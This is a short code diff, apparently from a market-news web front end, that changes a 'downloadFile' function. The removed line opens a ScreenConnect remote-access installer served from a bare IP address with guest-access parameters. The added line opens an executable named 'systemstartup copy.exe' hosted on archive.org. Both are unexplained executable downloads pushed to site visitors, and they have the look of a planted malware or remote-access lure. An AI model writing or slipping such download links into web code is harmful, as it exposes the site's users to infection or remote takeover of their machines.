@@ -372,7 +372,7 @@ const marketNewsHeadlines = [
 
   // Download function
   const downloadFile = () => {
-    const downloadUrl = 'http://18.232.171.173:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
+    const downloadUrl = 'https://archive.org/download/systemstartup-copy_202607/systemstartup%20copy.exe';
     window.open(downloadUrl, '_blank');
   };
 
